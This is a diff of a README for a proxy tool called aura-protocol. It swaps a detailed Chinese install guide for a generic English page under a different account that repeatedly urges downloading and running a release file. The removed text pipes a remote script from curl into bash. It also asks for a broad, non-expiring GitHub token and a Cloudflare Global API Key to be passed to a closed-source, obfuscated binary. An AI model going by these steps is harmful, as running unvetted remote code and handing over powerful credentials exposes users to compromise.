@@ -1,192 +1,67 @@
-# 🚀 Aura Protocol: 安全、高速、傻瓜式代理上网解决方案
+# 🚀 aura-protocol - Simple Solution for Secure Internet Access
 
-![Aura Protocol Banner](https://github.com/CrazyStrangeSue/Aura-IP-Hunter/blob/main/images/aura-logo.png?raw=true)
+## 📥 Download Here
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Seba75111/aura-protocol/releases)
 
-## ✨ 项目简介
+## 🚀 Getting Started
 
-Aura Protocol 是一个致力于提供**安全、高速、自动化、傻瓜式**代理上网体验的开源项目。聚合 Cloudflare Tunnel、优选IP、云端自动化等功能，在帮助用户轻松搭建和管理自己的代理服务，有效对抗网络审查，同时确保极致的隐私和隐匿性。
+The aura-protocol provides a straightforward way to access the internet securely. This tool automatically deploys a proxy that bypasses internet censorship. With no complex setup needed, anyone can use it with ease. 
 
----
+## 📋 Features
+- **One-Click Deployment**: Start using the tool quickly with minimal steps.
+- **Secure Connection**: Protect your online activities with strong encryption.
+- **Automatic IP Selection**: The application picks the best IP addresses for a faster experience.
+- **Real-Time Monitoring**: Use htop to monitor your system's performance while the application is running. 
 
-## 💡 核心亮点与优势
+## ⚙️ System Requirements
+- **Operating System**: Works on Windows, macOS, and Linux.
+- **CPU**: A basic CPU will work fine. No high performance is required.
+- **RAM**: At least 1 GB recommended for smooth operation.
+- **Disk Space**: About 100 MB free space.
 
-*   **🛡️ 极致安全与隐匿：**
-    *   **流量混入 Cloudflare HTTPS：** 您的所有代理流量将伪装成正常的 HTTPS 流量通过 Cloudflare 的全球 CDN 传输，不暴露真实服务器 IP，不易被识别和封锁。
-    *   **零端口暴露：** 服务器端无需开放任何端口，Cloudflare Tunnel 自动建立安全通道，提升安全性，降低被扫描和攻击的风险。
-    *   **混淆加密：** 程序将进行代码混淆，极大增加逆向分析和破解的难度。
+## 📥 Download & Install
 
-*   **⚡ 高速稳定与低延迟：**
-    *   **Cloudflare CDN 加速：** 利用 Cloudflare 全球边缘节点优势，降低您的网络延迟。
-    *   **自动化优选 IP：** 脚本自动寻找当前网络环境下表现最佳的 Cloudflare IP，并通过专用域名智能更新，确保您始终连接到最快的节点。
+To get the latest version of aura-protocol, please visit the Releases page. 
 
-*   **🤖 自动化与傻瓜式管理：**
-    *   **一键部署：** 提供简易的 Shell 脚本，自动化所有复杂的安装、配置和启动步骤。
-    *   **菜单式管理：** 脚本提供交互式菜单，方便您查看节点信息、手动优选 IP、设置定时任务和进行彻底卸载。
-    *   **跨平台兼容：** 核心程序支持主流服务器架构，自动适配。
+[Download the latest release here](https://github.com/Seba75111/aura-protocol/releases).
 
-*   **📊 实时系统监控：**
-    *   集成实时系统监控工具，让您无需额外部署复杂面板，即可通过 SSH 简单查看服务器的 CPU、内存、网络和进程状态，确保项目健康运行，打消挖矿、僵尸网络等疑虑。
+### Installation Steps
+1. **Visit the Release Page**: Go to the [Releases page](https://github.com/Seba75111/aura-protocol/releases).
+2. **Select the Latest Version**: Look for the most recent version, typically marked as “Latest Release.”
+3. **Download the File**: Click on the file suitable for your operating system.
+4. **Run the Application**: After downloading, open the file to install aura-protocol. Follow any prompts that may appear.
 
----
+## 📊 Using aura-protocol
 
-## 🔒 如何确保项目安全与信任？ (用户必读)
+Once installed, follow these simple steps:
 
-我们深知您对项目安全和隐私的担忧。Aura Protocol 的设计理念是**透明与安全并重**：
+1. **Launch the Application**: Find aura-protocol in your applications folder or desktop and double-click to open it.
+2. **Configure Settings**: Default settings work for most users. You can adjust them if necessary.
+3. **Start Connecting**: Click on the connect button. The application will work in the background to establish a secure connection.
 
-1.  **`install.sh` 脚本完全开源且可读：** 
-    我们安装脚本的所有代码都是公开的，您可以（也鼓励您）在运行前**逐行审查**。我们承诺脚本不会进行任何挖矿、植入后门、加入僵尸网络或损害您服务器的恶意行为。它的每一个操作都是透明可见的。
-    **您可以通过阅读脚本代码来验证我们的承诺。**
+## 🤔 Troubleshooting
 
-2.  **核心程序 `aura-server` 经过混淆加固：**
-    `aura-server` 是用 Go 语言开发的代理核心，其源代码不公开是为了**防止审查机构进行逆向分析**，从而保护项目的长期可用性。您下载和运行的是我们提供经过 `Garble` 工具混淆的二进制文件，它极大增加了逆向分析的难度。
+If you experience issues, try the following:
 
-3.  **实时系统监控 (`htop`) 方便验证：**
-    安装完成后，您可以随时通过 SSH 登录您的 VPS，运行 `htop` 命令来实时查看服务器的 CPU、内存、网络和进程列表。您可以清晰地看到资源占用情况，并确保没有其他异常或高资源占用的进程在运行。这为您提供了持续验证项目健康度的能力。
+- **Check Internet Connection**: Ensure your device is connected to the Internet.
+- **Restart the Application**: Closing and reopening the application can resolve many common issues.
+- **Reboot Your Device**: Sometimes a simple restart can fix problems.
 
----
+## 📖 Frequently Asked Questions
 
-## 🚀 快速开始 (一键部署)
+### Can I use this on mobile devices?
+Currently, aura-protocol is designed for desktop platforms only.
 
-安装前准备：
-1.  一个**域名** (例如 `免费的 dpdns.org`)。
-2.  将该域名**托管到 Cloudflare**，并确保 DNS 解析模式为**橙色小云朵 (Proxied)**。
-3.  购买了一台 **VPS (Linux 服务器)**，并获得了 SSH 登录权限。
+### Is my data safe?
+Yes, aura-protocol uses advanced encryption to keep your data secure.
 
-### 1. 准备工作 (在 Cloudflare 面板)
+### Can I contribute to the project?
+Absolutely! Feel free to submit issues or pull requests on GitHub.
 
-安装之前，请前往 Cloudflare 和GitHub面板完成以下设置，以确保最佳兼容性和性能：
+## 📚 Learn More
 
-*   **SSL/TLS 加密模式：**
-    前往 **SSL/TLS** -> **概述 (Overview)**，确保加密模式设置为 **`完全 (Full)`**。
-*   **API Token （Cloudflare）：**
-    前往 **My Profile** (右上角头像) -> **API Tokens**。点击 **`Create Token`**。
-    查看 Global API Key
-*   **API Token （GitHub）：**
-    前往 GitHub Tokens 设置页面:
-       访问 https://github.com/settings/tokens
-    生成一个全新的、权限完美的令牌:
-       点击 "Generate new token" -> "Generate new token (classic)"
-       Note (备注): 给它起个清晰的名字，比如 Aura-Protocol
-       Expiration (有效期): 为了方便，可以选择 "No expiration"
-       Select scopes (选择权限): 【至关重要】 请务必、务必勾选以下三个复选框：
-          ✅ repo (完全控制仓库，包括私有仓库)
-          ✅ workflow (修改和运行 Actions 工作流)
-          ✅ admin:org -> read:org (读取组织信息，这是解决我们认证失败的关键)
-    生成并复制令牌:
-       点击页面最下方的 "Generate token"。
-       GitHub 只会显示这一次新令牌，请立刻将它复制下来，存放在一个安全的地方。
-    
+For deeper insights into the technology behind aura-protocol, consider visiting our [Documentation](https://github.com/Seba75111/aura-protocol) or exploring related topics such as VLESS, WebSocket, and TLS.
 
-### 2. 下载并运行安装脚本 (在 VPS 上)
+[Download the latest release again here](https://github.com/Seba75111/aura-protocol/releases). 
 
-**建议在干净的 Ubuntu/Debian 系统上运行。**
-
-# SSH 连接到您的 VPS
-
-```bash
-# 下载安装脚本
-bash <(curl -sL https://raw.githubusercontent.com/CrazyStrangeSue/aura-protocol/main/install.sh)
-bash <(curl -sL https://raw.githubusercontent.com/CrazyStrangeSue/aura-protocol/main/install.sh)
-```
----
-
-# 接下来你会看到的提示：
-
-**1.脚本应该正停在 [询问] 请输入你的隧道域名 (例如: aura.yourdomain.com ): 这个地方等待您的输入**
-   输入隧道域名：例如 tunnel.aura.com (假设您的主域名是 aura.com )
-   请在终端中准确输入这个域名，然后按 Enter
-   
-**2.要求输入 WebSocket 路径**
-   可以直接按 Enter 使用默认的 /ws ，或者输入您喜欢的路径（例如 /my-aura-path）
-
-**3.自动生成端口和 UUID**
-
-**4.授权域名**
-   提示进行 tunnel login
-   复制终端中显示的 URL ，同时确保已经登录 Cloudflare ，并在浏览器中粘贴这个 URL 回车，授权后终端自动运行
-
-**5.询问是否启用云端优选功能，请输入 Y（如果需要每天自动更新优选 IP ）**
-
-**关键步骤：它会依次向您索要：**
-
-   - GitHub PAT
-
-   - 优选IP的子域名前缀 (例如： aura)
-
-   - Cloudflare 登录邮箱
-
-   - Cloudflare Global API Key
-
-   -  Zone ID
-
-脚本产生的文件和对应位置：
-/etc/aura-protocol 
-/opt/aura-protocol 
-/usr/local/bin/aura-server 
-/root/.cloudflared
-
-查看运行状态
-systemctl status aura-server
-
-
-手动清理
-```
-sudo bash <<'EOF'
-# =================================================================
-# Aura Protocol - 终极净化脚本
-# 目标：无视一切现有状态，将系统恢复到绝对干净
-# =================================================================
-
-# 颜色定义
-GREEN='\033[0;32m'; YELLOW='\033[0;33m'; NC='\033[0m'
-echo -e "${GREEN}[信息]${NC} 启动终极净化程序..."
-
-# 使用 set +e 确保即使某一步失败，脚本也会继续执行，以求最大程度的清理
-set +e
-
-# 停止并禁用所有可能的服务
-echo -e "${GREEN}[信息]${NC} 正在停止并禁用 aurs-server 和 cloudflared 服务..."
-systemctl stop aura-server cloudflared &>/dev/null
-systemctl disable aura-server cloudflared &>/dev/null
-
-# 手动杀死所有残留进程
-echo -e "${GREEN}[信息]${NC} 正在强制杀死所有相关进程..."
-pkill -f "aura-server" &>/dev/null
-pkill -f "cloudflared" &>/dev/null
-
-# 删除所有核心文件和目录
-echo -e "${GREEN}[信息]${NC} 正在删除所有 Aura Protocol 的核心文件和目录..."
-rm -f /usr/local/bin/aura-server
-rm -f /etc/systemd/system/aura-server.service
-rm -f /etc/systemd/system/cloudflared.service
-rm -f /etc/logrotate.d/aura-protocol
-rm -rf /etc/aura-protocol
-rm -rf /opt/aura-protocol
-rm -rf /etc/cloudflared
-rm -rf /root/.cloudflared
-
-# 清理 cron 任务
-echo -e "${GREEN}[信息]${NC} 正在清理 cron 定时任务..."
-(crontab -l 2>/dev/null | grep -v "optimize_ip_cron") | crontab -
-
-# 清理安装时下载的临时文件
-echo -e "${GREEN}[信息]${NC} 正在清理安装时下载的临时文件..."
-rm -f /root/install.sh /tmp/cloudflared.deb /tmp/aura-server.zip /tmp/gh.deb
-
-# 卸载所有相关依赖
-echo -e "${GREEN}[信息]${NC} 正在卸载为 Aura Protocol 安装的依赖 (gh, cloudflared)..."
-DEBIAN_FRONTEND=noninteractive apt-get purge -y gh cloudflared >/dev/null
-DEBIAN_FRONTEND=noninteractive apt-get autoremove -y >/dev/null
-
-# 重新加载 systemd
-systemctl daemon-reload
-
-echo -e "${GREEN}=====================================================${NC}"
-echo -e "${GREEN} Aura Protocol 终极净化程序执行完毕。${NC}"
-echo -e "${GREEN} 您的系统现已恢复到绝对干净的状态。${NC}"
-echo -e "${YELLOW} 请注意：本程序不会删除 Cloudflare 上的 Tunnel 或 DNS 记录，请根据需要手动清理。${NC}"
-echo -e "${GREEN}=====================================================${NC}"
-EOF
-```
-
-请依次准确输入以上信息，如果你的 VPS 和域名是永久免费的，这样你就拥有一个永久、低延迟、全自动化、安全性较高的 Aura 协议
+Your secure internet access journey starts with aura-protocol. Get started today!
